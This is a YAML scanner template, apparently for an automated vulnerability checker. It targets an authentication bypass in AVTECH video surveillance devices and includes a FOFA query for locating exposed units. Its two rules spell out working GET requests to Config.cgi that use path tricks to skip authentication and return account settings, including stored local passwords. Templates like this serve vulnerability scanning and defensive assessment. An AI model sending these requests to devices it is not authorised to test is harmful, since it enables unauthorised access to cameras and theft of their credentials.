expression: r0() || r1()
id: avtech-password-disclosure
info:
  author: zan8in
  description: "fofa: app=\"AVTECH-\u89C6\u9891\u76D1\u63A7\"\n"
  name: "AVTECH \u89C6\u9891\u76D1\u63A7\u8BBE\u5907\u8BA4\u8BC1\u7ED5\u8FC7"
  reference:
  - https://www.seebug.org/vuldb/ssvid-92494
  severity: critical
  verified: true
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(b'Account.Maxuser=')
      && response.body.bcontains(b'Account.LocalPassword=')
    request:
      method: GET
      path: /cgi-bin/user/Config.cgi?.cab&action=get&category=Account.*
  r1:
    expression: response.status == 200 && response.body.bcontains(b'Account.Maxuser=')
      && response.body.bcontains(b'Account.LocalPassword=')
    request:
      method: GET
      path: /cgi-bin/user/Config.cgi?/nobody&action=get&category=Account.*
